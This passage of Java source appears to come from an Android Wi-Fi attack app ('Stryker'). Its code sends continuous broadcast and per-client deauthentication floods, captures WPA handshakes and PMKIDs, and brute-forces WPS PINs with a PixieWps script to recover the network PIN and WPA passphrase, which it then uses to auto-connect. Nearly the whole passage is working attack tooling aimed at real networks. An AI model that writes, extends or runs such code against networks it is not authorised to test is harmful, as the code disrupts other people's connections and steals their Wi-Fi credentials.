                                burstLog = WifiDeauthEngine.fireMdk4Burst(
                                        core, deauthIface, bssid, ch, sink);
                                // Also directed aireplay at each discovered client
                                if (!snapshot.isEmpty()) {
                                    sendEvent("Directed deauth → " + snapshot.size() + " client(s)…");
                                    for (String client : snapshot) {
                                        if (isCanceled()) break;
                                        WifiDeauthEngine.fireDirectedBurst(
                                                core, deauthIface, bssid, client, sink);
                                    }
                                    burstLog += " + directed x" + snapshot.size();
                                }
                            } else {
                                if (snapshot.isEmpty()) {
                                    sendEvent("No clients yet — broadcast deauth only this round");
                                } else {
                                    sendEvent("Deauth broadcast + " + snapshot.size()
                                            + " directed client(s)");
                                }
                                burstLog = WifiDeauthEngine.fireBurst(
                                        core, deauthIface, bssid, snapshot, sink);
                            }
                            sendEvent("Burst done: " + burstLog
                                    + " · listening " + WifiDeauthEngine.BURST_INTERVAL_SEC + "s…");

                            // Retune only when aireplay complained about channel
                            if (burstLog != null && burstLog.contains("(warn)")) {
                                core.lockWifiChannel(hsIface, channelStr);
                                core.lockWifiChannel(deauthIface, channelStr);
                            }

                            // Also verify .cap via aircrack (airodump UI line is easy to miss)
                            if (WifiDeauthEngine.capHasHandshake(core,
                                    "/sdcard/Stryker/hs/handshake-01.cap")) {
                                sendEvent("aircrack-ng confirms handshake in cap file");
                                hsStatus[0] = true;
                                break;
                            }

                            long burstWaitUntil = System.currentTimeMillis()
                                    + WifiDeauthEngine.BURST_INTERVAL_SEC * 1000L;
                            while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()
                                    && System.currentTimeMillis() < burstWaitUntil) {
                                try {
                                    Thread.sleep(500);
                                } catch (InterruptedException e) {
                                    break;
                                }
                            }
                        }
                        if (airodump != null) {
                            airodump.kill();
                        }
                        if (isCanceled()) {
                            return;
                        }
                        if (hsStatus[0]) {
                            sendEvent("Handshake captured!");
                            String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
                            String filename = "HS_" + network.getSsid().replace(" ", "_") + time + ".cap";
                            core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap",
                                    core.getStorage() + "Stryker/captured/" + filename);
                            sendEvent("Saved → /sdcard/Stryker/captured/" + filename);
                            com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
                                    context, network.getMac(), network.ssid);
                            activity.runOnUiThread(this::onFinished);
                        } else if (pmkidStatus[0]) {
                            sendEvent("PMKID captured!");
                            String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
                            String filename = "PMKID_" + network.getSsid().replace(" ", "_") + time + ".cap";
                            core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap",
                                    core.getStorage() + "Stryker/captured/" + filename);
                            sendEvent("Saved → /sdcard/Stryker/captured/" + filename);
                            com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
                                    context, network.getMac(), network.ssid);
                            activity.runOnUiThread(this::onFinished);
                        }

                    }else {
                        sendEvent("Failed to start monitor mode");
                        setCanceled(true);
                    }
                }

                @Override
                public void onCanceled() {
                    sendEvent("Attack canceled.");
                    activity.runOnUiThread(() -> {
                        core.scale(wifiimg,1.0F);
                        core.scale(attack_progress,0.0F);
                        cancel.setText(android.R.string.ok);
                        deauthtimer.cancel();
                        if(airodump != null){
                            airodump.kill();
                        }
                        if(deauther != null){
                            deauther.kill();
                        }
                    });
                    new Thread(() -> {
                        try { core.killWifiAttackTools(); } catch (Exception ignored) {}
                        try {
                            core.monitorManager.disableMonitorMode(core.getHSInterface());
                            core.monitorManager.disableMonitorMode(core.getDeauthInterface());
                        } catch (Exception ignored) {}
                    }).start();
                }
            };
            
        }
        else if (type == 4){
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + " -B -b " + network.getMac();
            if (core.getString(network.getMac()+"_pin").length() > 0){
                cmd = cmd + " -p " + core.getString(network.getMac()+"_pin");
                outputtext.append("Restoring progress: "+core.getString(network.getMac()+"_pin")+"\n");
            }




            brutepin = new AdvancedProcess(activity,context,cmd,true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    WiFINetwork back = issuccess(outputList);
                    outputcard.setVisibility(View.GONE);
                    resulttext.setVisibility(View.VISIBLE);
                    if (back.getOK()){
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
                        }
                        core.scale(wifiimg,1.0F);
                        core.scale(attack_progress,0.0F);
                        cancel.setText(android.R.string.ok);
                        resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                        autoconnect.setVisibility(View.VISIBLE);
                    }else{
                        resulttext.setText("Pin not found!");
                        autoconnect.setVisibility(View.GONE);
                    }
                }

                @Override
                public void onNewLine(String line) {
                    if(core.getBoolean("hide")){
                        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                        if (m.find()){
                            line = line.replace(m.group(), Core.HIDDEN_MAC);
                        }


                    }
                    if (line.contains("Trying PIN")){
                        Matcher m = Pattern.compile("[0-9]+").matcher(line);
                        if (m.find()){
                            core.putString(network.getMac()+"_pin",m.group());
                        }
                    }
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }
                @Override
                public void onEvent(String line) {

                }
            };
        }
        else if (type == 5){
            final String[] pin = {""};
            core.scale(wifiimg,0.65F);
            core.scale(attack_progress,1.0F);
                final Dialog valuedialog = new Dialog(context);
                valuedialog.setContentView(R.layout.input_dialog);
                android.view.Window vWin = valuedialog.getWindow();
                if (vWin != null) {
                    vWin.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                    vWin.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                }
                TextView title = valuedialog.findViewById(R.id.title);
                TextInputEditText valueedit = valuedialog.findViewById(R.id.value);
            MaterialButton ok = valuedialog.findViewById(R.id.ok);
            MaterialButton dismiss = valuedialog.findViewById(R.id.cancel);
            dismiss.setOnClickListener(view12 -> valuedialog.dismiss());
                title.setText(R.string.enter_pin);
                ok.setOnClickListener(view -> {
                        pin[0] = Objects.requireNonNull(valueedit.getText()).toString();
                      if (pin[0].length() == 8){
                        valuedialog.dismiss();
                        core.scale(wifiimg,0.65F);
                        core.scale(attack_progress,1.0F);
                        cancel.setText(android.R.string.cancel);
                        outputtext.setText(context.getResources().getString(R.string.piin)+ pin[0]);
                        outputtext.append("Trying to connect...");
                        smoothScrool(outputtext);

                          core.wpsDisableWifiIfEnabled();
                          String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pin[0] +" -b " + network.getMac();
                          new AdvancedProcess(activity, context, cmd, true) {
                              @Override
                              public void onFinished(ArrayList<String> outputList) {
                                    restoreWpsInterface();
                                    WiFINetwork back = issuccess(outputList);
                                    outputcard.setVisibility(View.GONE);
                                    resulttext.setVisibility(View.VISIBLE);
                                    core.scale(wifiimg,1.0F);
                                    core.scale(attack_progress,0.0F);
                                    cancel.setText(android.R.string.ok);
                                    if (back.getOK()){
                                        if (core.isStoreEnabled()) {
                                            core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
                                        }
                                        resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
                                        autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                                        autoconnect.setVisibility(View.VISIBLE);
                                    }else{
                                        resulttext.setText("Pin incorrect!");
                                        autoconnect.setVisibility(View.GONE);
                                    }
                              }

                              @Override
                              public void onNewLine(String line) {
                                  if(core.getBoolean("hide")){
                                  Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                                  if (m.find()){
                                      line = line.replace(m.group(), Core.HIDDEN_MAC);
                                  }
                                  }
                                  outputtext.append(line + "\n");
                                  smoothScrool(outputtext);
                              }

                              @Override
                              public void onEvent(String line) {

                              }
                          };
                      }else{
                        valueedit.setError("Pin must be 8 digits!");
                      }

               });
                valuedialog.setOnDismissListener(dialogInterface -> {
                    if (pin[0].length() <8){
                        dialog.dismiss();
                    }
                });
                valuedialog.show();

        }
        else if (type == 6){
            core.scale(wifiimg,0.65F);
            core.scale(attack_progress,1.0F);
            cancel.setText(android.R.string.cancel);
            outputtext.setText("Trying to generate common pins...\n");
            ArrayList<String> pins = new ArrayList<>();
            ArrayList<String> outputList;
            Context app = context;
            new SimpleProcess(activity,"wpspin "+network.getMac()+" -A",true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    if (outputList.size() > 0){
                        Pattern p = Pattern.compile("[0-9]{8}");
                        for (String line : outputList){
                            Matcher m = p.matcher(line);
                            if (m.find()){
                                pins.add(m.group());
                            }
                        }
                    }

                    final int[] pin_count = {pins.size()};

                    String[] pins_list = new String[pins.size()+1];
                    for (int i = 1; i < pins.size()+1; i++){
                        pins_list[i] = pins.get(i-1);
                    }
                    pins_list[0] = "Test all";
                    AtomicBoolean selected = new AtomicBoolean(false);
                    new MaterialAlertDialogBuilder(app)
                            .setTitle("Select pin")
                            .setItems(pins_list, (dialogInterface, i) -> {
                                core.wpsDisableWifiIfEnabled();
                                selected.set(true);
                                if (i == 0){
                                    if (pins.size() > 0){
                                        outputtext.append("Generated "+ pin_count[0] +" pins\n"); AdvancedProcess temp = null;
                                        final WiFINetwork[] result = {null};
                                        new AdvancedThread(activity, app) {
                                            @Override
                                            public void onFinished() {
                                                restoreWpsInterface();
                                                core.scale(wifiimg,1.0F);
                                                core.scale(attack_progress,0.0F);
                                                cancel.setText(android.R.string.ok);
                                                outputcard.setVisibility(View.GONE);
                                                resulttext.setVisibility(View.VISIBLE);
                                                if (result[0] != null && result[0].getOK()){
                                                    if (core.isStoreEnabled()) {
                                                        core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
                                                    }
                                                    resulttext.setText(context.getResources().getString(R.string.piin)+ result[0].getPin()+"\n"+context.getResources().getString(R.string.pass) + result[0].getPsk());
                                                    autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                                                    autoconnect.setVisibility(View.VISIBLE);}
                                                else {
                                                    resulttext.setText("Pin not found!");
                                                    autoconnect.setVisibility(View.GONE);
                                                }
                                            }

                                            @Override
                                            public void eventListener(String line) {
                                                outputtext.append(line+"\n");
                                                smoothScrool(outputtext);
                                            }

                                            @Override
                                            public void doOnBackground() {
                                                try {
                                                    Thread.sleep(4000);
                                                } catch (InterruptedException e) {
                                                    e.printStackTrace();
                                                }
                                                String scaninterface = core.getWPSInterface();
                                                for (String pin :pins){
                                                    pin_count[0]--;
                                                    sendEvent("Trying pin "+pin+" Left: "+ pin_count[0]);
                                                    String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + scaninterface + core.wpsIfaceDownFlag() + " -p "+pin+" -b " + network.getMac();
                                                    ArrayList<String> output = core.customChrootCommand(cmd);
                                                    for (String line : output){
                                                        sendEvent(line);
                                                    }
                                                    result[0] = issuccess(output);
                                                    if (result[0].getOK()){
                                                        break;
                                                    }
                                                    if (canceled){
                                                        break;
                                                    }
                                                }
                                            }

                                            @Override
                                            public void onCanceled() {

                                            }
                                        };



                                    }
                                }else{
                                    core.scale(wifiimg,0.65F);
                                    core.scale(attack_progress,1.0F);
                                    cancel.setText(android.R.string.cancel);
                                    outputtext.setText(context.getResources().getString(R.string.piin)+ pins.get(i-1));
                                    outputtext.append("Trying to connect... with pin "+pins.get(i-1)+"\n");
                                    smoothScrool(outputtext);

                                    String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pins.get(i-1) +" -b " + network.getMac();
                                    new AdvancedProcess(activity, context, cmd, true) {
                                        @Override
                                        public void onFinished(ArrayList<String> outputList) {
                                            restoreWpsInterface();
                                            WiFINetwork back = issuccess(outputList);
                                            outputcard.setVisibility(View.GONE);
                                            resulttext.setVisibility(View.VISIBLE);
                                            core.scale(wifiimg,1.0F);
                                            core.scale(attack_progress,0.0F);
                                            cancel.setText(android.R.string.ok);
                                            if (back.getOK()){
                                                if (core.isStoreEnabled()) {
                                                    core.saveNetwork(network.getMac(),network.getPsk(),network.getPin(),network.ssid);
                                                }
                                                resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
                                                autoconnect.setOnClickListener(view -> core.connectWiFi2(network.getSsid(),network.getPsk()));
                                                autoconnect.setVisibility(View.VISIBLE);
                                            }else{
                                                resulttext.setText("Pin incorrect!");
                                                autoconnect.setVisibility(View.GONE);
                                            }
                                        }

                                        @Override
                                        public void onNewLine(String line) {
                                            if(core.getBoolean("hide")){
                                                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                                                if (m.find()){
                                                    line = line.replace(m.group(), Core.HIDDEN_MAC);
                                                }
                                            }
                                            outputtext.append(line + "\n");
                                            smoothScrool(outputtext);
                                        }

                                        @Override
                                        public void onEvent(String line) {

                                        }
                                    };
                                }
                            }).setOnDismissListener(dialog1 -> {
                                if (!selected.get()){
                                    dialog.dismiss();
                                }
                            })
                            .show();
                }
            };


        }
        else if (type == 7){
            String deauthRaw = core.getString("wlan_deauth");
            if (deauthRaw == null) deauthRaw = "";
            int channel = network.getChannel();
            String bssid = network.getMac();
            if (channel <= 0) {
                outputtext.append("Invalid channel (" + channel + "). Rescan WiFi and try again.\n");
            } else {
                String channelStr = String.valueOf(channel);
                outputtext.append("=== Continuous deauth ===\n");
                outputtext.append("Target: " + network.getSsid() + " (" + bssid + ")\n");
                outputtext.append("Channel: " + channelStr + "\n");
                if (deauthRaw.matches("s?wlan0")) {
                    outputtext.append("Using " + deauthRaw + " (monitor stays on wlan0, no *mon rename). "
                            + "Injection depends on your kernel/driver.\n");
                }
                outputtext.append("Enabling monitor mode on " + deauthRaw + " ch " + channelStr + "...\n");
                boolean ok = core.enableMonitorMode(deauthRaw, channelStr);
                String deauthIface = core.getDeauthInterface();
                if (ok) {
                    core.lockWifiChannel(deauthIface, channelStr);
                    outputtext.append("Monitor OK · iface=" + deauthIface
                            + " · locked ch " + channelStr + "\n");
                    outputtext.append("Mode: continuous flood (broadcast forever + directed clients)\n");
                    ArrayList<String> liveClients = new ArrayList<>();
                    if (network.getClients() != null) {
                        for (String c : network.getClients()) {
                            if (c == null) continue;
                            String mac = c.trim().toLowerCase(Locale.US);
                            if (mac.contains(":") && !liveClients.contains(mac)) {
                                liveClients.add(mac);
                            }
                        }
                    }
                    if (!liveClients.isEmpty()) {
                        refreshClientsLabel(clientsLabel, liveClients);
                        outputtext.append("Using " + liveClients.size()
                                + " client(s) from monitor scan; watching for new ones…\n");
                        for (String c : liveClients) {
                            outputtext.append("  · " + c + "\n");
                        }
                    } else {
                        outputtext.append("No pre-scanned clients — discovering…\n");
                    }
                    Set<String> directedStarted = new HashSet<>();
                    // Pre-mark known clients so first directed round hits them immediately
                    for (String c : liveClients) {
                        directedStarted.add(c.toLowerCase(Locale.US));
                    }

                    WifiDeauthEngine.LineSink uiSink = line -> activity.runOnUiThread(() -> {
                        String out = line;
                        if (core.getBoolean("hide")) {
                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(out);
                            if (m.find()) {
                                out = out.replace(m.group(), Core.HIDDEN_MAC);
                            }
                        }
                        outputtext.append(out + "\n");
                        smoothScrool(outputtext);
                    });

                    // Discover clients (and retune awareness)
                    String airoCmd = "airodump-ng " + deauthIface
                            + " --ignore-negative-one --bssid " + bssid
                            + " -c " + channelStr + " --update 2 2>&1";
                    uiSink.onLine("[airodump] " + airoCmd);
                    airodump = new AdvancedProcess(activity, context, airoCmd, true) {
                        @Override public void onFinished(ArrayList<String> outputList) {
                            uiSink.onLine("[airodump] exited");
                        }
                        @Override public void onEvent(String line) { }
                        @Override
                        public void onNewLine(String line) {
                            if (line == null || line.trim().isEmpty()) return;
                            int before = liveClients.size();
                            WifiDeauthEngine.collectClientsFromAirodump(
                                    line, bssid, liveClients, uiSink);
                            if (liveClients.size() != before) {
                                refreshClientsLabel(clientsLabel, liveClients);
                            }
                        }
                    };
                    airodump.setNoLog(true);

                    // Continuous broadcast deauth — all aireplay lines go to the window
                    String bcCmd = WifiDeauthEngine.continuousBroadcastCmd(deauthIface, bssid);
                    uiSink.onLine("[aireplay] " + bcCmd);
                    deauther = new AdvancedProcess(activity, context, bcCmd, true) {
                        @Override
                        public void onFinished(ArrayList<String> outputList) {
                            uiSink.onLine("[aireplay] broadcast process exited");
                        }

                        @Override
                        public void onNewLine(String line) {
                            if (line == null || line.trim().isEmpty()) return;
                            String out = line.trim();
                            if (core.getBoolean("hide")) {
                                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(out);
                                if (m.find()) {
                                    out = out.replace(m.group(), Core.HIDDEN_MAC);
                                }
                            }
                            outputtext.append(out + "\n");
                            smoothScrool(outputtext);
                            String low = out.toLowerCase(Locale.US);
                            if (low.contains("no such device") || low.contains("injection is currently impossible")) {
                                outputtext.append("Deauth may have failed — card may lack injection.\n");
                            } else if (out.contains("channel -1") || out.contains("Waiting for beacon")) {
                                core.lockWifiChannel(deauthIface, channelStr);
                                uiSink.onLine("[aireplay] retuned channel " + channelStr);
                            }
                        }

                        @Override
                        public void onEvent(String line) { }
                    };

                    // While broadcast floods, keep hitting known clients with directed frames
                    // (separate short aireplay runs — avoids AdvancedProcess static-process clash).
                    new Thread(() -> {
                        int idleTicks = 0;
                        while (!finished[0]) {
                            ArrayList<String> snap = WifiDeauthEngine.copyClients(liveClients);
                            if (snap.isEmpty()) {
                                if (idleTicks % 3 == 0) {
                                    uiSink.onLine("[deauth] waiting for clients… (broadcast still running)");
                                }
                                idleTicks++;
                            } else {
                                idleTicks = 0;
                                refreshClientsLabel(clientsLabel, snap);
                                uiSink.onLine("[deauth] clients (" + snap.size() + "): "
                                        + String.join(", ", snap));
                                for (String client : snap) {
                                    if (finished[0]) break;
                                    String key = client.toLowerCase(Locale.US);
                                    if (!directedStarted.contains(key)) {
                                        directedStarted.add(key);
                                        uiSink.onLine("[deauth] new client → targeting " + client);
                                    }
                                    WifiDeauthEngine.fireDirectedBurst(
                                            core, deauthIface, bssid, client, uiSink);
                                }
                            }
                            try {
                                Thread.sleep(4000);
                            } catch (InterruptedException e) {
                                break;
                            }
                        }
                        if (airodump != null) airodump.kill();
                        if (deauther != null) deauther.kill();
                    }, "stryker-deauth-clients").start();
                } else {
                    outputtext.append(context.getString(R.string.wifi_monitor_failed, deauthRaw) + "\n");
                }
            }
        }
    }







    public void restoreWpsInterface() {
        new Thread(() -> {
            String wpsIface = core.getWPSInterface();
            if (wpsIface != null && wpsIface.length() > 0) {
                core.customCommand("ifconfig " + wpsIface + " up", true);
            }
            String hsIface = core.getHSInterface();
            if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                core.customCommand("ifconfig " + hsIface + " up", true);
            }
            if (core.isPixieIfaceDown()) {
                core.customCommand("svc wifi enable", true);
            }
        }).start();
    }

    /** Seed clients line under SSID from last monitor scan — count only. */
    private void seedClientsLabel(TextView clientsLabel, WiFINetwork network) {
        if (clientsLabel == null || network == null) return;
        int cc = network.getClientCount();
        clientsLabel.setVisibility(View.VISIBLE);
        if (cc > 0) {
            clientsLabel.setText(cc + (cc == 1 ? " client" : " clients"));
        } else {
            clientsLabel.setText("Clients: listening…");
        }
    }

    /** Live update — count only under the WiFi name (MACs stay in the log). */
    private void refreshClientsLabel(TextView clientsLabel, Iterable<String> clients) {
        if (clientsLabel == null || activity == null) return;
        int count = 0;
        if (clients != null) {
            for (String c : clients) {
                if (c != null && c.contains(":")) count++;
            }
        }
        final int cc = count;
        activity.runOnUiThread(() -> {
            clientsLabel.setVisibility(View.VISIBLE);
            if (cc <= 0) {
                clientsLabel.setText("Clients: listening…");
            } else {
                clientsLabel.setText(cc + (cc == 1 ? " client" : " clients"));
            }
        });
    }

    public WiFINetwork issuccess(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            } else if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        if (out.isEmpty()) {
            back.setCanceled(true);
        }
        return back;
    }


    public boolean checkIsSsidConnected(String ssid){
        String line;
        boolean result = false;
        try {

            Process process = Runtime.getRuntime().exec("su -mm");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();
            stdin.write(("dumpsys netstats | grep wlan" + '\n').getBytes());
            stdin.write(("\n").getBytes());
            stdin.flush();
            stdin.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            while ((line = br.readLine()) != null) {
                if (line.contains(ssid)) {
                    result = true;
                }
            }
            br.close();
            process.waitFor();
            process.destroy();
        } catch (IOException e) {
        } catch (InterruptedException ex) {
        }

        return result;
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void createBruteNotification(String key, int prog, int max) {
        Intent intent = new Intent(core.getContext(), MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(core.getContext(), 0, intent, Utils.setPendingIntentFlag());
        String CHANNEL_ID = "BruteForce PSK";
        NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "BruteForce PSK", NotificationManager.IMPORTANCE_LOW);

        NotificationCompat.Builder b = new NotificationCompat.Builder(core.getContext());

        b.setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.bolt)
                .setTicker("Brute")
                .setContentTitle(key)
                .setChannelId(CHANNEL_ID)
                .setDefaults(Notification.DEFAULT_LIGHTS | Notification.DEFAULT_SOUND)
                .setContentIntent(contentIntent)
                .setProgress(max, prog, false)
                .setContentInfo("Info");


        NotificationManager notificationManager = (NotificationManager) core.getContext().getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(5, b.build());
    }
    public void toaster(String msg) {
        activity.runOnUiThread(() -> {
            Toast toast = Toast.makeText(context,
                    msg, Toast.LENGTH_SHORT);
            toast.show();
        });

    }

    public void settext(String text, TextView output) {
        activity.runOnUiThread(() -> output.setText(text));
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    public void changeitem(WiFINetwork temp, int pos) {
        activity.runOnUiThread(() -> {
            wifilist.set(pos, temp);
            notifyItemChanged(pos);

        });
    }

    @Override
    public int getItemViewType(int position) {
        return position;
    }
    public WiFINetwork pixie(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS pin:")) {
                pin = s.replace("[+] WPS pin: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        return back;
    }

    public static class ViewHolder extends RecyclerView.ViewHolder {
        public TextView wifi_name;
        public TextView wifi_mac;
        public TextView wifi_model;
        public TextView wifi_power;
        public TextView wifi_clients;
        public TextView wps_mark;
        public TextView five_mark;
        public TextView pixie_mark;
        public TextView lock_mark;
        public TextView key_mark;
        public TextView iswps;
        public View card;
        public ImageView icon;
        public View divider;


        public ViewHolder(View v) {
            super(v);
            wifi_name = v.findViewById(R.id.wifi_name);
            wifi_mac = v.findViewById(R.id.wifi_bssid);
            wifi_model = v.findViewById(R.id.wifi_model);
            wifi_power = v.findViewById(R.id.wifi_power);
            wifi_clients = v.findViewById(R.id.wifi_clients);
            iswps = v.findViewById(R.id.iswps);
            card = v.findViewById(R.id.item);
            icon = v.findViewById(R.id.icon_wifi);
            wps_mark = v.findViewById(R.id.wps_mark);
            five_mark = v.findViewById(R.id.five_mark);
            pixie_mark = v.findViewById(R.id.pixie_mark);
            lock_mark = v.findViewById(R.id.lock_mark);
            key_mark = v.findViewById(R.id.key_mark);
            divider = v.findViewById(R.id.wifi_item_divider);
        }

    }

}
